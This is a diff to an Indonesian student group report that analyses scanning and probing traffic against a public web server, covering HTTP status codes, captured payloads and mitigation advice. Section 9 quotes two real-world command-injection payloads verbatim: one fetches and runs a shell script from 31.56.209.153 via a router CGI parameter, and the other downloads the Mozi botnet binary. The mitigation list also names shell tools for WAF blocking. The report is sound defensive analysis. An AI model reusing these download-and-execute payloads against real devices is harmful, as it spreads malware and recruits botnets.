@@ -6,7 +6,7 @@
 | :--- | :--- | :--- |
 | Afriezal | 50272510xx | Poin 1 - 4 (Pendahuluan, Profiling IP, Jenis Scan, & Target Port) |
 | D'Qhaizhar Ari Dhiaulhaq | 5027251083 | Poin 5 - 7 (Anomali Volume, I/O Graph, & Analisis User-Agent) |
-| Rayhan | 50272510xx | Poin 8 - 10 (Status Respon Server, Payload, & Kesimpulan Mitigasi) |
+| Rayhan Fadhilah Allayn | 5027251126 | Poin 8 - 10 (Status Respon Server, Payload, & Kesimpulan Mitigasi) |
 
 ## 1. Pendahuluan
 Dalam tugas kelompok ini, kami mengambil studi kasus mengenai analisis lalu lintas jaringan pada sebuah server web publik yang menghadapi pemindaian (*scanning*), *probe*, dan trafik mencurigakan dari internet selama tujuh hari
@@ -79,16 +79,41 @@ Berikut adalah rincian 10 poin utama yang kamianalisis beserta cara mengidentifi
   * Hal ini membuktikan bahwa penyerang tidak menggunakan peramban web standar (seperti Chrome atau Firefox), melainkan menggunakan skrip otomatisasi atau *custom program* berbasis bahasa pemrograman Go (*Golang HTTP Client*) untuk melakukan *automated probing* dan pengiriman perintah eksploitasi ke web server.
 
 ### 8. Status Respon Server (HTTP Response Status Codes)
-* **Cara Identifikasi:** 
+* **Cara Identifikasi:** Diidentifikasi melalui kolom status code pada log akses web server Apache atau packet capture (pcap) Wireshark, yang mencatat kode tiga digit respon HTTP dari server untuk setiap permintaan client.
 * **Hasil Analisis:** 
+- 404 Not Found: Muncul pada permintaan ke endpoint `/goform/set_LimitClient_cfg`, `/login`, dan `/favicon.ico`. Menandakan path atau komponen target tidak ada di server.
+
+- 405 Method Not Allowed: Terjadi pada permintaan dengan metode `CONNECT 104.16.185.241:443`. Server menolak karena hanya mendukung metode `POST`, `OPTIONS`, `HEAD`, dan `GET`.
+
+- 400 Bad Request: Muncul saat penyerang mengirimkan permintaan berprotokol HTTP/2 (`PRI * HTTP/2.0`) atau header tidak valid ke port HTTP standar (80).
+
+- 200 OK: Terjadi pada akses halaman utama (`GET /`) dari lalu lintas normal maupun alat pemindai otomatis (CensysInspect dan zgrab), menunjukkan server berhasil menyajikan konten HTML wiresharkworkshop.online.
 
 ### 9. Analisis Payload atau Data yang Dikirim (Request Parameters / POST Data)
-* **Cara Identifikasi:**
+* **Cara Identifikasi:** Diidentifikasi dengan menganalisis string URL query, parameter request, serta body payload (POST data) pada log HTTP request atau rekonstruksi stream HTTP di Wireshark untuk menemukan sintaks perintah sistem, skrip berbahaya, atau pola eksploitasi.
+
 * **Hasil Analisis:** 
 
+- **Command Injection via `/goform/set_LimitClient_cfg`**:
+  - **Payload**:
+  `time1=00:00-00:00&time2=00:00-00:00&mac=;wget 31.56.209.153/nz.sh; curl -O 31.56.209.153/nz.sh; chmod 777 nz.sh; sh nz.sh; rm -rf nz.sh; rm -rf nz.sh*`
+  - **Analisis**: Upaya menginjeksi perintah shell melalui parameter `mac` pada form router Tenda/CGI untuk mengunduh, mengeksekusi, dan menghapus skrip berbahaya (`nz.sh`) dari IP `31.56.209.153`.
+
+- **Eksploitasi Mozi Botnet via `/board.cgi`**:
+  - **Payload:** `GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+[http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron](http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron)`
+  - **Analisis:** Upaya memanfaatkan kerentanan Command Injection pada interface CGI untuk mengunduh malware Mozi Botnet (`Mozi.a`) ke direktori `/tmp` dan menjalankannya di background.
+
+- **Reconnaissance & Automated Scanning**: 
+Pemindaian otomatis menggunakan User-Agent seperti CensysInspect/1.1 dan zgrab/0.x untuk mengidentifikasi port terbuka, versi Apache (2.4.58 Ubuntu), serta struktur direktori web.
+
 ### 10. Kesimpulan & Rekomendasi Mitigasi (Security Hardening)
-* **Kesimpulan:** 
+* **Kesimpulan:** Server target secara aktif menjadi sasaran pemindaian otomatis dan percobaan serangan Remote Code Execution (RCE) / Command Injection yang bertujuan merekrut perangkat ke dalam botnet (seperti Mozi) serta mengunduh payload berbahaya. Seluruh percobaan eksploitasi dalam log ini gagal karena endpoint sasaran tidak ditemukan (404) atau metode ditolak (405).
+
 * **Rekomendasi Mitigasi:** 
-  1. 
+  1. Sanitasi & Validasi Input: Validasi dan bersihkan seluruh masukan pengguna dari karakter khusus shell (seperti ;, &, |, `, $) pada aplikasi web.
+  2. Implementasi WAF (Web Application Firewall): Pasang WAF untuk mendeteksi dan memblokir otomatis permintaan yang mengandung pola perintah shell berbahaya (wget, curl, chmod, sh, rm).
+  3. Pengerasan Direktori Temporary (/tmp): Mount direktori /tmp dengan opsi noexec untuk mencegah eksekusi file biner atau skrip berbahaya yang diunggah.
+  4. Pembatasan Metode HTTP & Akses CGI: Nonaktifkan metode HTTP yang tidak relevan serta hapus atau batasi akses ke endpoint CGI/legacy yang tidak digunakan.
+  5. Pemblokiran IP Berbahaya: Blokir IP yang terindikasi melakukan aktivitas eksploitasi (seperti 31.56.209.153) menggunakan firewall (iptables/UFW).
 
 ---
